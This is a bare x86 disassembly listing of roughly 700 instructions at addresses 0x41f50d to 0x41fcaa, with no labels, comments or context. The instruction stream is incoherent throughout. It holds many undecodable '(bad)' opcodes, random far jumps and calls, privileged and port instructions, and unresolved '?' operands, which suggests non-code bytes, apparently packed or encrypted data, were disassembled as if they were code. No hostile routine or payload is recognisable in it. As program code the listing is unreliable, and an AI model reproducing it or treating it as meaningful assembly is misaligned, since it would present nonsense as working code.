  41f50d:	mov    ecx,0xa8036a79
  41f512:	shl    ah,cl
  41f514:	inc    esp
  41f515:	fsub   st,st(7)
  41f517:	jg     0x41f4e6
  41f519:	push   0xffffffca
  41f51b:	jmp    0x38eb:0x4ad4da51
  41f522:	mov    bh,dh
  41f524:	sar    BYTE PTR [eax-0x75],cl
  41f527:	ja     0x41f4da
  41f529:	bswap  edx
  41f52b:	sahf   
  41f52c:	rcr    ebp,0xbe
  41f52f:	and    BYTE PTR [ebx+0x52fdeee6],ah
  41f535:	sbb    ah,BYTE PTR [ebx-0x3c]
  41f538:	sbb    eax,0x847afc8d
  41f53d:	push   esi
  41f53e:	stos   DWORD PTR es:[edi],eax
  41f53f:	stos   DWORD PTR es:[edi],eax
  41f540:	dec    edx
  41f541:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f542:	daa    
  41f543:	and    al,0x5a
  41f545:	xor    al,0x56
  41f547:	or     al,0x7f
  41f54a:	and    DWORD PTR [ecx],eax
  41f54c:	jmp    0xd470:0x3cdd4ccd
  41f553:	imul   edx,DWORD PTR [ebp-0x1a],0xffffffc1
  41f557:	push   0xffffff97
  41f559:	js     0x41f5be
  41f55b:	adc    BYTE PTR [ebp+0x5ecdd37f],bl
  41f561:	cwde   
  41f562:	ins    BYTE PTR es:[edi],dx
  41f563:	mov    DWORD PTR ss:[esi],0x5c0980c0
  41f56a:	iret   
  41f56b:	loop   0x41f503
  41f56d:	jmp    0x41f5cd
  41f56f:	sbb    eax,0x12cce43f
  41f574:	pop    edi
  41f575:	sub    ebx,DWORD PTR [ebx+0x21]
  41f578:	pop    es
  41f579:	arpl   WORD PTR [edx-0x58],di
  41f57c:	(bad)  
  41f57e:	push   ecx
  41f57f:	fcmovu st,st(1)
  41f581:	or     eax,DWORD PTR [ebp+0x93b2a28]
  41f587:	jl     0x41f5be
  41f589:	pop    edi
  41f58a:	adc    DWORD PTR [edi+0x6],ecx
  41f58d:	push   edi
  41f58e:	mov    edx,0x75360b2a
  41f593:	(bad)  
  41f594:	pop    esp
  41f595:	or     esi,DWORD PTR [ecx]
  41f597:	jno    0x41f5ca
  41f599:	push   cs
  41f59a:	push   ecx
  41f59b:	pop    ebx
  41f59c:	pushf  
  41f59d:	mov    eax,ds:0x350c13ae
  41f5a2:	jmp    0xac26d047
  41f5a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f5a8:	(bad)  
  41f5a9:	(bad)  
  41f5ab:	push   0xd76b91f4
  41f5b0:	xchg   BYTE PTR [eax-0x415c408f],bl
  41f5b6:	xchg   esp,eax
  41f5b7:	sub    DWORD PTR [ecx+edx*1-0x64],edx
  41f5bb:	pushf  
  41f5bc:	cwde   
  41f5bd:	fsubr  st,st(5)
  41f5bf:	add    DWORD PTR [ebp+0x55cce810],ecx
  41f5c5:	das    
  41f5c6:	xor    BYTE PTR [ebx+0xc],al
  41f5c9:	push   0xb97543e9
  41f5ce:	pop    edx
  41f5cf:	stos   DWORD PTR es:[edi],eax
  41f5d0:	and    al,0x4d
  41f5d2:	int    0xae
  41f5d4:	push   cs
  41f5d5:	xor    dh,BYTE PTR [ebx-0x7780ab8b]
  41f5db:	dec    edx
  41f5dc:	inc    ecx
  41f5dd:	cs push ebp
  41f5df:	aad    0x8c
  41f5e1:	sub    esi,edx
  41f5e3:	and    BYTE PTR [edi+0x6d343b57],bl
  41f5e9:	cli    
  41f5ea:	cmp    cl,BYTE PTR [edi+0x53]
  41f5ed:	sub    eax,0x129cd1d9
  41f5f2:	inc    ebp
  41f5f3:	sub    dl,dl
  41f5f5:	(bad)  
  41f5f7:	xor    DWORD PTR [esi+0x4aaa47a9],ecx
  41f5fd:	jno    0x41f650
  41f5ff:	in     eax,dx
  41f600:	(bad)  
  41f602:	xchg   edx,eax
  41f603:	add    eax,ebp
  41f605:	jnp    0x41f5f3
  41f607:	addr16 out dx,eax
  41f609:	mov    ah,0xd5
  41f60b:	jge    0x41f674
  41f60d:	jg     0x41f5a1
  41f60f:	cmp    bh,al
  41f611:	fld    DWORD PTR [edi]
  41f613:	ret    0x62fa
  41f616:	sahf   
  41f617:	xor    ch,BYTE PTR [eax+0x27]
  41f61a:	fidivr WORD PTR [ebx-0x7e]
  41f61d:	mov    ebp,0xf3cddd7f
  41f622:	outs   dx,BYTE PTR ds:[esi]
  41f623:	xor    ebp,eax
  41f625:	jmp    0x41f5e4
  41f627:	pop    ecx
  41f628:	rcl    DWORD PTR ds:0x49d49613,0x5a
  41f62f:	jmp    DWORD PTR [edx-0x144f5c8]
  41f635:	pop    ebp
  41f636:	sbb    bh,BYTE PTR [ecx]
  41f638:	jg     0x41f662
  41f63a:	or     ecx,esi
  41f63c:	ja     0x41f64b
  41f63e:	sub    bh,ch
  41f640:	add    eax,0x582a6cf7
  41f645:	cdq    
  41f646:	ds dec edx
  41f648:	push   0x4b3183b7
  41f64d:	xchg   DWORD PTR [ebp-0x1f161028],esi
  41f653:	shufps xmm6,XMMWORD PTR [eax+ecx*8-0x673e4a85],0x50
  41f65c:	call   0xa6fa2cf2
  41f661:	pop    es
  41f662:	cmp    cl,BYTE PTR [eax+0x61]
  41f665:	shl    DWORD PTR [esi+0x34],1
  41f668:	xchg   edx,eax
  41f669:	add    DWORD PTR [eax],0xffffff82
  41f66c:	adc    al,0xb5
  41f66e:	outs   dx,BYTE PTR ds:[esi]
  41f66f:	out    dx,al
  41f670:	lds    edx,FWORD PTR [edi]
  41f672:	jnp    0x41f6ec
  41f674:	imul   eax,DWORD PTR [ecx-0x75fd5b0d],0x53
  41f67b:	add    eax,0x2608a243
  41f680:	(bad)  
  41f681:	out    dx,eax
  41f682:	sbb    bl,al
  41f684:	pop    ecx
  41f685:	mov    ecx,0x4a873889
  41f68a:	xor    eax,DWORD PTR [eax+0x3f]
  41f68d:	ins    DWORD PTR es:[edi],dx
  41f68e:	nop
  41f68f:	cmc    
  41f690:	lods   al,BYTE PTR ds:[esi]
  41f691:	xchg   ecx,eax
  41f692:	push   0x43d36dc
  41f697:	dec    ecx
  41f698:	pop    eax
  41f699:	shr    BYTE PTR [ebx],1
  41f69b:	loope  0x41f62f
  41f69d:	iret   
  41f69e:	popa   
  41f69f:	xor    dl,BYTE PTR [edx+esi*8]
  41f6a2:	and    DWORD PTR [edx-0x42],ecx
  41f6a5:	sbb    DWORD PTR [edi-0x252d6c6],eax
  41f6ab:	jp     0x41f697
  41f6ad:	xor    edx,ebp
  41f6af:	push   ebx
  41f6b0:	mov    ds:0xc33564e7,al
  41f6b5:	jp     0x41f6d7
  41f6b7:	mov    cl,0x82
  41f6b9:	icebp  
  41f6ba:	mov    BYTE PTR [edi-0x73],ch
  41f6bd:	int3   
  41f6be:	lods   eax,DWORD PTR ds:[esi]
  41f6bf:	imul   ecx,ebx,0x1f
  41f6c2:	(bad)  
  41f6c4:	jle    0x41f662
  41f6c6:	test   eax,0x11e3bbd8
  41f6cb:	and    BYTE PTR [ebx],ch
  41f6cd:	in     eax,dx
  41f6ce:	lods   al,BYTE PTR ds:[esi]
  41f6cf:	(bad)  
  41f6d0:	and    ebx,DWORD PTR [ecx+0x52ff0fb0]
  41f6d6:	push   0x8566543e
  41f6db:	add    BYTE PTR cs:[edx+0x3e],cl
  41f6df:	mov    al,ds:0x74db3ee9
  41f6e4:	push   edi
  41f6e5:	jnp    0x41f684
  41f6e7:	dec    eax
  41f6e8:	mov    ds:0x962e871f,eax
  41f6ed:	lods   al,BYTE PTR ds:[esi]
  41f6ee:	mov    cl,0xd7
  41f6f0:	jmp    0xd243:0x92561b24
  41f6f7:	in     al,dx
  41f6f8:	push   es
  41f6f9:	jmp    0x6215:0x3ea08894
  41f700:	cmp    DWORD PTR [ebp-0x7d7174cd],ecx
  41f706:	mov    ds:0xb269460e,al
  41f70b:	and    al,0x9f
  41f70d:	adc    dh,ah
  41f70f:	scas   al,BYTE PTR es:[edi]
  41f710:	push   ecx
  41f711:	pop    ebx
  41f712:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f713:	or     DWORD PTR [ecx-0x28f45c],ecx
  41f719:	je     0x41f793
  41f71b:	leave  
  41f71c:	repnz lahf 
  41f71e:	call   0xd300:0xeff18866
  41f725:	in     eax,0xf2
  41f727:	pop    ecx
  41f728:	mov    eax,ds:0xd8f5ca46
  41f72d:	cli    
  41f72e:	cld    
  41f72f:	jno    0x41f733
  41f731:	enter  0x6d21,0x39
  41f735:	ret    
  41f736:	jo     0x41f6f6
  41f738:	test   al,0xf2
  41f73a:	cmp    DWORD PTR [edx+0x57],esi
  41f73d:	test   DWORD PTR [ebp-0x4eb546ae],0x447ee563
  41f747:	int3   
  41f748:	pop    ebp
  41f749:	int    0xe0
  41f74b:	out    dx,al
  41f74c:	xor    eax,0x1fe7265c
  41f751:	push   cs
  41f752:	ret    
  41f753:	cs pop ecx
  41f755:	rcr    BYTE PTR [esi],0x1e
  41f758:	or     al,0xa4
  41f75a:	test   DWORD PTR [edx-0xc],ecx
  41f75d:	jmp    0xc079:0x5edb6010
  41f764:	gs pop ss
  41f766:	xchg   edx,eax
  41f767:	aam    0x75
  41f769:	or     BYTE PTR [ecx],0x72
  41f76c:	stc    
  41f76d:	jae    0x41f77d
  41f76f:	test   al,0xb9
  41f771:	mov    ebx,0xc46d86bb
  41f776:	dec    eax
  41f777:	jecxz  0x41f7c0
  41f779:	repnz mov al,BYTE PTR [edx-0x4b]
  41f77d:	mov    ebx,?
  41f77f:	jne    0x41f793
  41f781:	mov    DWORD PTR [edx],edx
  41f783:	mov    edi,0xd55d4c44
  41f788:	test   DWORD PTR [esi+esi*2-0x40ccb6da],0x9c1dced5
  41f793:	sbb    DWORD PTR [esi+0x208db062],eax
  41f799:	xchg   DWORD PTR [ebp+0x4e],edx
  41f79c:	imul   esp,DWORD PTR ds:0xde904fd3,0xffffff8e
  41f7a3:	into   
  41f7a4:	jnp    0x41f7ad
  41f7a6:	or     al,0x89
  41f7a8:	sti    
  41f7a9:	gs push edx
  41f7ab:	popf   
  41f7ac:	std    
  41f7ad:	and    al,0x40
  41f7af:	push   cs
  41f7b0:	imul   ebp,DWORD PTR [ebp-0xd412297],0xffffffca
  41f7b7:	inc    edi
  41f7b8:	jne    0x41f79f
  41f7ba:	pop    edi
  41f7bb:	inc    eax
  41f7bc:	mov    ds:0x882fe1d5,al
  41f7c1:	cmp    ch,0x41
  41f7c4:	aaa    
  41f7c5:	sub    BYTE PTR [ebx-0x3bf79437],dl
  41f7cb:	test   DWORD PTR [edi+ebx*4],eax
  41f7ce:	test   BYTE PTR [ecx],dl
  41f7d0:	popf   
  41f7d1:	jecxz  0x41f76b
  41f7d3:	dec    ecx
  41f7d4:	in     eax,dx
  41f7d5:	mov    esp,DWORD PTR [edi+ebx*8-0x697860c4]
  41f7dc:	push   0xf2cfed16
  41f7e1:	xor    bh,BYTE PTR [eax-0x371d546e]
  41f7e7:	sbb    eax,0xd76e1d28
  41f7ec:	in     al,0xa5
  41f7ee:	add    dl,ch
  41f7f0:	ds inc esp
  41f7f2:	call   0x8c28ee20
  41f7f7:	out    dx,al
  41f7f8:	adc    DWORD PTR [edx+0x1a],esp
  41f7fb:	test   esi,esp
  41f7fd:	xchg   DWORD PTR [edi+edx*1],edi
  41f800:	jg     0x41f82c
  41f802:	mov    esp,0x6c0ebd
  41f807:	xchg   ebx,eax
  41f808:	jns    0x41f7da
  41f80a:	mov    ah,0xd8
  41f80c:	(bad)  
  41f80e:	sub    BYTE PTR [ebx],ah
  41f810:	shl    al,cl
  41f812:	iret   
  41f813:	mov    ecx,DWORD PTR [eax+0x23]
  41f816:	cmp    BYTE PTR [ecx+0x24],al
  41f819:	jle    0x41f7ae
  41f81b:	in     al,0xb3
  41f81d:	xchg   ecx,eax
  41f81e:	mov    eax,ds:0xfd1aae09
  41f823:	pusha  
  41f824:	test   al,0xeb
  41f826:	xor    eax,DWORD PTR [edi+eiz*4-0x3701789f]
  41f82d:	aam    0x84
  41f82f:	push   eax
  41f830:	pop    esp
  41f831:	and    BYTE PTR [ecx],ch
  41f833:	js     0x41f82c
  41f835:	xchg   ebx,eax
  41f836:	fdiv   QWORD PTR [ebx]
  41f838:	fmul   QWORD PTR ds:0xdb3147ef
  41f83e:	fsubr  DWORD PTR [esi+0x63]
  41f841:	sub    edi,DWORD PTR [ebx-0x47]
  41f844:	test   al,0xd4
  41f846:	mov    bh,0x44
  41f848:	push   edx
  41f849:	mov    ecx,0x74c51f24
  41f84e:	jmp    0x41f813
  41f850:	push   ebx
  41f851:	cmp    eax,edi
  41f853:	mov    eax,0x73131fd1
  41f858:	fcomp  QWORD PTR [eax+0x60cfd214]
  41f85e:	data16 jge 0x41f873
  41f861:	xor    DWORD PTR [ebx],ecx
  41f863:	jo     0x41f8b1
  41f865:	push   esp
  41f866:	push   ss
  41f867:	push   eax
  41f868:	imul   ebx,DWORD PTR [eax-0x38b7ef0],0x35
  41f86f:	bound  ebx,QWORD PTR [ecx]
  41f871:	test   eax,0x9e4ed00a
  41f876:	jo     0x41f866
  41f878:	xor    DWORD PTR [esi-0x7c],0xe4059477
  41f87f:	fdivr  QWORD PTR [esi]
  41f881:	std    
  41f882:	and    eax,DWORD PTR [edx+0x3e]
  41f885:	enter  0x8b90,0xac
  41f889:	sbb    eax,0xfc85d755
  41f88e:	sbb    edx,ebp
  41f890:	xchg   ecx,eax
  41f891:	dec    ebx
  41f892:	call   0x8504:0x98b4b856
  41f899:	mov    ebp,0xbf0eca48
  41f89e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f89f:	add    eax,0xc22a5f27
  41f8a4:	add    dl,bl
  41f8a6:	or     dh,BYTE PTR [ecx+0x1c]
  41f8a9:	add    ebp,edx
  41f8ab:	push   0x7876b5b1
  41f8b0:	je     0x41f8ff
  41f8b2:	dec    ecx
  41f8b3:	sbb    dl,BYTE PTR [ebx+0x69]
  41f8b6:	rcr    DWORD PTR [edx+ecx*4+0x640e360c],0x26
  41f8be:	in     eax,dx
  41f8bf:	lea    ebp,[ecx+ecx*1]
  41f8c2:	scas   al,BYTE PTR es:[edi]
  41f8c3:	nop
  41f8c4:	jg     0x41f936
  41f8c6:	mov    DWORD PTR [edi],0x94b836b
  41f8cc:	inc    ebp
  41f8cd:	xor    edi,DWORD PTR [esi+eiz*2]
  41f8d0:	lea    eax,[eax]
  41f8d2:	fdiv   QWORD PTR [edx+0xa869c38]
  41f8d8:	mov    ch,0xbb
  41f8da:	retf   
  41f8db:	inc    ecx
  41f8dc:	(bad)  
  41f8dd:	ss cmp cl,bh
  41f8e0:	push   cs
  41f8e1:	sub    bl,BYTE PTR [esi+0xf0a7aeb]
  41f8e7:	mov    ch,0x65
  41f8e9:	icebp  
  41f8ea:	jecxz  0x41f886
  41f8ec:	loopne 0x41f8ba
  41f8ee:	addr16 xchg edx,eax
  41f8f0:	jmp    0x41f8be
  41f8f2:	(bad)  
  41f8f3:	call   0x3bed:0x28eb9961
  41f8fa:	rcl    DWORD PTR [ebp-0x43236c66],1
  41f900:	lods   eax,DWORD PTR ds:[esi]
  41f901:	or     ecx,DWORD PTR [edi]
  41f903:	sti    
  41f904:	and    cl,BYTE PTR [ebp+0x49]
  41f907:	push   edi
  41f908:	mov    ah,0x20
  41f90a:	ins    DWORD PTR es:[edi],dx
  41f90b:	mov    eax,ds:0x1b4a3de1
  41f910:	cld    
  41f911:	xchg   esp,eax
  41f912:	cmp    al,0x5b
  41f914:	or     DWORD PTR [edx+0x7d],esp
  41f917:	push   ebx
  41f918:	add    al,0xd8
  41f91a:	sysenter 
  41f91c:	loop   0x41f96d
  41f91e:	stos   DWORD PTR es:[edi],eax
  41f91f:	test   DWORD PTR [eax],esi
  41f921:	or     DWORD PTR [esi-0x2295e399],0x76272cfd
  41f92b:	jecxz  0x41f942
  41f92d:	xor    ebp,DWORD PTR [edi+ebp*4-0x2b]
  41f931:	or     eax,0x3e35afd7
  41f936:	add    al,0x94
  41f938:	jecxz  0x41f928
  41f93a:	mov    WORD PTR [edx+0x3b0bdcbc],ds
  41f940:	das    
  41f941:	leave  
  41f942:	push   ebx
  41f943:	nop
  41f944:	imul   esi,DWORD PTR [esp+ecx*2+0xf],0x2c
  41f949:	mov    dh,bh
  41f94b:	in     al,dx
  41f94c:	mov    al,0x51
  41f94e:	push   esp
  41f94f:	push   ss
  41f950:	add    eax,0x9c36de89
  41f955:	pop    esp
  41f956:	popf   
  41f957:	loop   0x41f90a
  41f959:	ins    DWORD PTR es:[edi],dx
  41f95a:	mov    esi,0x22977d3f
  41f95f:	scas   al,BYTE PTR es:[edi]
  41f960:	sub    al,0xa1
  41f962:	cli    
  41f963:	xchg   edi,eax
  41f964:	adc    BYTE PTR [ecx-0x6bf43c2e],bl
  41f96a:	pop    ss
  41f96b:	jns    0x41f98f
  41f96d:	inc    eax
  41f96e:	xlat   BYTE PTR ds:[ebx]
  41f96f:	lea    esp,[ecx-0xa5802a7]
  41f975:	xchg   di,ax
  41f977:	mov    esp,DWORD PTR [esi]
  41f979:	push   cx
  41f97b:	sbb    ch,BYTE PTR [ebp+0x21e6cbc0]
  41f981:	stc    
  41f982:	mov    al,0x13
  41f984:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f985:	mov    esp,0xd60ec708
  41f98a:	mov    al,ds:0x7d13eb93
  41f98f:	js     0x41f949
  41f991:	inc    edx
  41f992:	in     eax,0xed
  41f994:	loopne 0x41f9b6
  41f996:	rol    DWORD PTR [esi-0x51c38959],0x3d
  41f99d:	inc    edx
  41f99e:	ins    DWORD PTR es:[edi],dx
  41f99f:	adc    edi,0xffffffa7
  41f9a2:	cmc    
  41f9a3:	hlt    
  41f9a4:	or     eax,DWORD PTR [ebp-0x23]
  41f9a7:	(bad)  
  41f9a8:	pushf  
  41f9a9:	jl     0x41f92e
  41f9ab:	mov    edx,0xe65c537d
  41f9b0:	ja     0x41f96d
  41f9b2:	sub    eax,0x10e2fd03
  41f9b7:	sar    DWORD PTR [eax-0x40],0xd9
  41f9bb:	and    dh,BYTE PTR [esi-0x271e6d14]
  41f9c1:	sub    edx,DWORD PTR [eax+ebx*2]
  41f9c4:	int3   
  41f9c5:	test   BYTE PTR [ecx],0xd4
  41f9c8:	jmp    0x41f959
  41f9ca:	imul   edi,DWORD PTR [eax-0x7b],0x516d8ec1
  41f9d1:	fdiv   st(7),st
  41f9d3:	sub    DWORD PTR [esi-0x32541a79],ebp
  41f9d9:	mov    esi,0x5fd2c380
  41f9de:	xor    ecx,DWORD PTR [ebp+eax*1-0x76]
  41f9e2:	lods   eax,DWORD PTR ds:[esi]
  41f9e3:	cmp    eax,0x2971bdb8
  41f9e8:	lods   eax,DWORD PTR ds:[esi]
  41f9e9:	cmp    bh,ah
  41f9eb:	into   
  41f9ec:	pop    ss
  41f9ed:	pop    esi
  41f9ee:	stos   BYTE PTR es:[edi],al
  41f9ef:	jmp    0xc8dd30b6
  41f9f4:	jecxz  0x41f9b4
  41f9f6:	cmp    BYTE PTR [esi-0x77bbdbe7],ah
  41f9fc:	test   al,0x89
  41f9fe:	lahf   
  41f9ff:	add    eax,0x20b3cd5a
  41fa04:	xchg   ecx,eax
  41fa05:	mov    edi,0xfc553d4b
  41fa0a:	stos   BYTE PTR es:[edi],al
  41fa0b:	or     ebp,DWORD PTR [esi]
  41fa0d:	xchg   esi,eax
  41fa0e:	rcr    ch,cl
  41fa10:	cmp    esp,edi
  41fa12:	popf   
  41fa13:	xor    bh,BYTE PTR [edx+0x5b]
  41fa16:	into   
  41fa17:	rcr    DWORD PTR [esi-0x1d],0xd1
  41fa1b:	push   cs
  41fa1c:	add    eax,0x72ff510d
  41fa21:	push   ss
  41fa22:	stc    
  41fa23:	jno    0x41f9de
  41fa25:	popf   
  41fa26:	icebp  
  41fa27:	enter  0xadb6,0x21
  41fa2b:	cmp    bh,BYTE PTR [ecx-0x3a]
  41fa2e:	mov    ebp,0x2c7f1bef
  41fa33:	or     cl,BYTE PTR [edi+0x42fc1b87]
  41fa39:	lock (bad) [edi-0x42]
  41fa3d:	sub    cl,BYTE PTR [eax+eiz*1-0x1b]
  41fa41:	lock adc DWORD PTR [edi-0x22ae996b],0xffffff89
  41fa49:	push   edx
  41fa4a:	and    cl,cl
  41fa4c:	add    dl,bh
  41fa4e:	pop    ecx
  41fa4f:	fild   QWORD PTR [ebp+0xd]
  41fa52:	mov    dh,0x45
  41fa54:	add    dl,dl
  41fa56:	dec    edi
  41fa57:	push   ebx
  41fa58:	xor    cl,bh
  41fa5a:	aam    0x8b
  41fa5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa5d:	call   FWORD PTR [ebp+0x2]
  41fa60:	jno    0x41fa0c
  41fa62:	xor    DWORD PTR [eax+eax*8-0x6a],ecx
  41fa66:	pop    ecx
  41fa67:	add    ah,BYTE PTR [edi-0x2d]
  41fa6a:	das    
  41fa6b:	aam    0xe6
  41fa6d:	outs   dx,BYTE PTR ds:[esi]
  41fa6e:	sbb    dl,ah
  41fa70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa71:	pop    es
  41fa72:	add    DWORD PTR [eax+0x2c],0xffffffcd
  41fa76:	mov    BYTE PTR [ecx+0x75],0x4e
  41fa7a:	bound  edx,QWORD PTR [edx+edx*8]
  41fa7d:	sub    al,0xbb
  41fa7f:	dec    ecx
  41fa80:	xlat   BYTE PTR ds:[ebx]
  41fa81:	lods   eax,DWORD PTR ds:[esi]
  41fa82:	or     DWORD PTR [edi-0x10],edi
  41fa85:	cmp    al,0xcb
  41fa87:	or     edi,DWORD PTR [edi+0x7c]
  41fa8a:	fsubr  st,st(7)
  41fa8c:	int    0x44
  41fa8e:	mov    eax,0x1ad5da86
  41fa93:	or     dh,ah
  41fa95:	pop    ds
  41fa96:	jl     0x41fae7
  41fa98:	mov    WORD PTR [eax-0x4d5b182f],?
  41fa9e:	inc    esp
  41fa9f:	bound  edx,QWORD PTR [edx+0x79]
  41faa2:	mov    ebp,0x3d0ff5aa
  41faa7:	jl     0x41fa46
  41faa9:	xchg   ebp,eax
  41faaa:	pop    ss
  41faab:	push   edi
  41faac:	adc    al,0xd
  41faae:	jg     0x41faac
  41fab0:	and    eax,0x605a5534
  41fab5:	call   0x442a:0x140a1f31
  41fabc:	pusha  
  41fabd:	mov    ch,0xa8
  41fac0:	sub    BYTE PTR [esi-0x19956307],cl
  41fac6:	sar    BYTE PTR [ebx+0x32],1
  41fac9:	in     eax,0x21
  41facb:	adc    BYTE PTR [esi-0x60],al
  41face:	xchg   DWORD PTR [esi],ebx
  41fad0:	jo     0x41fa94
  41fad2:	in     al,dx
  41fad3:	jmp    0x4470:0xb7d9f10a
  41fada:	jp     0x41fb12
  41fadc:	mov    ah,0x91
  41fade:	add    eax,0x83e77777
  41fae3:	arpl   WORD PTR [eax-0x1f],ax
  41fae6:	sti    
  41fae7:	ds pop ss
  41fae9:	cmp    al,0x31
  41faeb:	bound  eax,QWORD PTR [edi]
  41faed:	les    ebp,FWORD PTR [edi+0x4a]
  41faf0:	pop    es
  41faf1:	xor    bh,BYTE PTR [ecx]
  41faf3:	sbb    eax,0x2e653270
  41faf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41faf9:	push   0x15
  41fafb:	jle    0x41fb1d
  41fafd:	dec    eax
  41fafe:	mov    al,ds:0xeb0647e
  41fb03:	push   ss
  41fb04:	push   ecx
  41fb05:	inc    ecx
  41fb06:	jo     0x41faca
  41fb08:	fstp   QWORD PTR [edx]
  41fb0a:	mov    bl,0x47
  41fb0c:	and    al,0xc2
  41fb0e:	add    BYTE PTR [esi-0x4a],0x7
  41fb12:	ficomp DWORD PTR [edx]
  41fb14:	mov    al,BYTE PTR [edi+ebx*8+0x60]
  41fb18:	sub    ebp,DWORD PTR [edi-0x3f]
  41fb1b:	dec    edx
  41fb1c:	mov    DWORD PTR [edx],ebp
  41fb1e:	ret    0x6293
  41fb21:	cld    
  41fb22:	bound  ebx,QWORD PTR [eax+0xe8fb546]
  41fb28:	lods   al,BYTE PTR ss:[esi]
  41fb2a:	pop    ecx
  41fb2b:	and    BYTE PTR [ebp+0x39],0x97
  41fb2f:	and    esp,DWORD PTR ds:0xd8413aad
  41fb35:	mov    cl,0x95
  41fb37:	push   es
  41fb38:	sbb    edi,DWORD PTR [ecx]
  41fb3a:	shr    DWORD PTR [esi+ecx*1-0x43a3b6f7],0xe2
  41fb42:	or     eax,eax
  41fb44:	dec    edi
  41fb45:	add    BYTE PTR [ecx-0x7eea323f],dl
  41fb4b:	dec    ebp
  41fb4c:	push   DWORD PTR [ebx-0x35]
  41fb4f:	into   
  41fb50:	xchg   esi,eax
  41fb51:	push   edi
  41fb52:	mov    ?,WORD PTR [edx+0x2a8968e1]
  41fb58:	out    0x62,eax
  41fb5a:	adc    dh,BYTE PTR [ecx+0x19dee88b]
  41fb60:	inc    ebx
  41fb61:	in     al,0x0
  41fb63:	pop    es
  41fb64:	push   esi
  41fb65:	pop    esp
  41fb66:	xchg   edx,eax
  41fb67:	not    DWORD PTR [ebx+edx*2+0x69]
  41fb6b:	sub    eax,0xca880fba
  41fb70:	(bad)  
  41fb71:	mov    dh,0xd8
  41fb73:	inc    ebx
  41fb74:	call   0x45b2207c
  41fb79:	mov    edx,0xb48284ee
  41fb7e:	push   0x38a86c6d
  41fb83:	and    DWORD PTR [ecx-0x4],ebx
  41fb86:	jmp    0xaccc:0xc9622595
  41fb8d:	push   eax
  41fb8e:	xlat   BYTE PTR ds:[ebx]
  41fb8f:	xchg   dx,ax
  41fb91:	jno    0x41fb71
  41fb93:	xchg   edi,edi
  41fb95:	fsub   QWORD PTR [ecx-0x5c74a15e]
  41fb9b:	or     al,BYTE PTR [edi+0x7e]
  41fb9e:	sbb    cl,BYTE PTR [ebx]
  41fba0:	fild   QWORD PTR [esi]
  41fba2:	push   edx
  41fba3:	test   BYTE PTR [eax-0x56],0xde
  41fba7:	xchg   esi,eax
  41fba8:	mov    ebx,0x48fd1724
  41fbad:	jns    0x41fb36
  41fbaf:	shr    BYTE PTR [ecx],0x85
  41fbb2:	inc    edi
  41fbb3:	xor    WORD PTR [esi+0x464658d4],0x46
  41fbbb:	mov    eax,DWORD PTR [ecx-0x9]
  41fbbe:	fisttp WORD PTR [ecx-0x73822e4d]
  41fbc4:	mov    ecx,0xe7506b16
  41fbc9:	pushf  
  41fbca:	pop    edi
  41fbcb:	push   ebp
  41fbcc:	inc    eax
  41fbcd:	sub    eax,0xa4efea4a
  41fbd2:	ja     0x41fbb8
  41fbd4:	fs retf 
  41fbd6:	add    eax,DWORD PTR [ecx-0x80]
  41fbd9:	int    0xdc
  41fbdb:	scas   al,BYTE PTR es:[edi]
  41fbdc:	jnp    0x41fba9
  41fbde:	adc    al,BYTE PTR [edx+0x2a8f6295]
  41fbe4:	or     eax,eax
  41fbe6:	repz inc ebp
  41fbe8:	(bad)
  41fbeb:	ins    BYTE PTR es:[edi],dx
  41fbec:	pop    ds
  41fbed:	imul   eax,DWORD PTR [eax],0x39d5b2e8
  41fbf3:	mov    esi,0xe963547
  41fbf8:	mov    dh,0x49
  41fbfa:	jae    0x41fbdb
  41fbfc:	call   WORD PTR [edx-0x49]
  41fc00:	test   eax,0x3c5d5117
  41fc05:	es add al,0x92
  41fc08:	mov    bh,0x9e
  41fc0a:	mov    edi,DWORD PTR [ebx-0x21]
  41fc0d:	call   0x44c8:0xff4cc413
  41fc14:	jmp    0x6bb1:0xe4d98e26
  41fc1b:	push   esp
  41fc1c:	stos   DWORD PTR es:[edi],eax
  41fc1d:	mov    ch,0xe0
  41fc1f:	adc    DWORD PTR [edx-0x22],0xffffff89
  41fc23:	adc    ch,BYTE PTR [ecx]
  41fc25:	fst    QWORD PTR [ecx+0x18e1187f]
  41fc2b:	push   edi
  41fc2c:	dec    esp
  41fc2d:	pop    edi
  41fc2e:	cld    
  41fc2f:	imul   esp,ebx,0xd288488e
  41fc35:	cmp    eax,0xec09c5b2
  41fc3a:	sub    eax,0x99c859a4
  41fc3f:	mov    BYTE PTR [edi],0x52
  41fc42:	push   eax
  41fc43:	loope  0x41fc2b
  41fc45:	push   esp
  41fc46:	dec    eax
  41fc47:	sub    al,0x59
  41fc49:	push   0xc89d18cc
  41fc4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc4f:	js     0x41fcaf
  41fc51:	mov    ebx,0xac07e06f
  41fc56:	dec    DWORD PTR [edx*4-0x460a9d96]
  41fc5d:	pop    esp
  41fc5e:	dec    esp
  41fc5f:	push   esp
  41fc60:	mov    eax,ds:0xd2a73b5d
  41fc65:	fimul  WORD PTR [esi+edi*1+0x19a90922]
  41fc6c:	je     0x41fc89
  41fc6e:	repnz retf 
  41fc70:	loopne 0x41fc70
  41fc72:	jae    0x41fc12
  41fc74:	es pop eax
  41fc76:	fdiv   QWORD PTR [edi-0x469032d]
  41fc7c:	push   ebp
  41fc7d:	mov    ah,0x45
  41fc7f:	dec    ebp
  41fc80:	or     al,0xb5
  41fc82:	mov    DWORD PTR [esi-0x63],esp
  41fc85:	jg     0x41fcbc
  41fc87:	xchg   esp,eax
  41fc88:	dec    edx
  41fc89:	push   ecx
  41fc8a:	fs aaa 
  41fc8c:	jns    0x41fc1b
  41fc8e:	cmp    edi,edx
  41fc90:	push   ebp
  41fc91:	popf   
  41fc92:	or     eax,0x45054b36
  41fc97:	mov    eax,ds:0x9f5afabf
  41fc9c:	or     eax,0xd1bd0312
  41fca1:	and    BYTE PTR [ebx-0x60],0xf5
  41fca5:	mov    dl,0xf1
  41fca7:	retf   
  41fca8:	cdq    
  41fca9:	(bad)  
  41fcaa:	jmp    0xb5ad:0xa63dc09c
